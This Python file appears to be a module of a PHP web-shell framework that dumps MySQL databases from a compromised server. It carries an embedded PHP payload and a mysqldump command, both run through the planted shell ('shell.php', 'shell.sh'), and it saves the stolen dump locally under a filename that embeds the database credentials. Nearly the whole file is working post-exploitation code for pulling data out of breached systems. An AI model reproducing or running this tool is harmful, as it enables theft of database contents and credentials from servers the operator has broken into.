from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from tempfile import mkdtemp
from os import path

mysqlphpdump = """
function dmp ($tableQ)
{
    $result = "\n-- Dumping data for table `$tableQ`\n";
    $query = mysql_query("SELECT * FROM ".$tableQ);
    $numrow = mysql_num_rows($query);
    $numfields = mysql_num_fields($query);
    print $numrow . " " . $numfields;
    if ($numrow > 0)
    {
        $result .= "INSERT INTO `".$tableQ."` (";
        $i = 0;
        for($k=0; $k<$numfields; $k++ )
        {
            $result .= "`".mysql_field_name($query, $k)."`";
            if ($k < ($numfields-1))
                $result .= ", ";
        }
        $result .= ") VALUES ";
        while ($row = mysql_fetch_row($query))
        {
            $result .= " (";
            for($j=0; $j<$numfields; $j++)
            {
                if (mysql_field_type($query, $j) == "string" ||
                    mysql_field_type($query, $j) == "timestamp" ||
                    mysql_field_type($query, $j) == "time" ||
                    mysql_field_type($query, $j) == "datetime" ||
                    mysql_field_type($query, $j) == "blob")
                {
                    $row[$j] = addslashes($row[$j]);
                    $row[$j] = ereg_replace("\n","\\n",$row[$j]);
                    $row[$j] = ereg_replace("\r","",$row[$j]);
                    $result .= "'$row[$j]'";
                }
                else if (is_null($row[$j]))
                    $result .= "NULL";
                else
                    $result .= $row[$j];
                if ( $j<($numfields-1))
                    $result .= ", ";
            }
            $result .= ")";
            $i++;
            if ($i < $numrow)
                $result .= ",";
            else
                $result .= ";";
            $result .= "\n";
        }
    }
    else
        $result .= "-- table is empty";
    return $result . "\n\n";
}
ini_set('mysql.connect_timeout',1);
$res=mysql_connect("$host", "$user", "$pass");
if(!$res) { print("-- DEFAULT\n"); }
else {
$db_name = "$db";
$db_table_name = "$table";
mysql_select_db($db_name);
$tableQ = mysql_list_tables ($db_name);
$i = 0;
$num_rows = mysql_num_rows ($tableQ);
if($num_rows) {
while ($i < $num_rows)
{
    $tb_names[$i] = mysql_tablename ($tableQ, $i);
    if(($db_table_name == $tb_names[$i]) || $db_table_name == "") {
        print(dmp($tb_names[$i]));
    }
    $i++;
}
}
mysql_close();
}"""

WARN_DUMP_ERR_SAVING = 'Can\'t save dump file'
WARN_DUMP_SAVED = 'Dump file saved'
WARN_DUMP_INCOMPLETE = 'Dump failed, saving anyway for debug purposes'
WARN_NO_DUMP = 'Dump failed, check credentials and dbms information'

class Dump(ModuleGuess):
    '''Get SQL database dump'''

    def _set_vectors(self):
        self.vectors.add_vector('mysqlphpdump', 'shell.php',  [ mysqlphpdump ] )
        self.vectors.add_vector('mysqldump', 'shell.sh', "mysqldump -h $host -u $user --password=$pass $db $table --single-transaction") 
        # --single-transaction to avoid bug http://bugs.mysql.com/bug.php?id=21527        
    
    
    def _set_args(self):
        self.argparser.add_argument('-user', help='SQL username')
        self.argparser.add_argument('-pass', help='SQL password')
        self.argparser.add_argument('db', help='Database to dump')
        self.argparser.add_argument('-table', help='Table to dump')
        self.argparser.add_argument('-host', help='DBMS host or host:port', default='127.0.0.1')
        #argparser.add_argument('-dbms', help='DBMS', choices = ['mysql', 'postgres'], default='mysql')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-ldump', help='Local path to save dump (default: temporary folder)')
        
    def _prepare_vector(self):
        if not self.args['table']:
            self.args['table'] = ''
        self.formatted_args = self.args.copy()
        
    def _verify_vector_execution(self):
        if self._result and '-- Dumping data for table' in self._result:
            raise ProbeSucceed(self.name,'Dumped')
            
    def _stringify_result(self):

        if self._result: 
            if not '-- Dumping data for table' in self._result:
                self.mprint(WARN_DUMP_INCOMPLETE)
            
            if not self.args['ldump']:
                temporary_folder = mkdtemp(prefix='weev_')
                self.args['ldump'] = path.join(temporary_folder, '%s:%s@%s-%s.txt' % (self.args['user'], self.args['pass'], self.args['host'], self.args['db']))
                
            try:
                lfile = open(self.args['ldump'],'w').write(self._result)
            except:
                raise ProbeException(self.name,  "\'%s\' %s" % (self.args['ldump'], WARN_DUMP_ERR_SAVING))
            else:
                self.mprint("\'%s\' %s" % (self.args['ldump'], WARN_DUMP_SAVED))
        else:
            raise ProbeException(self.name,  WARN_NO_DUMP)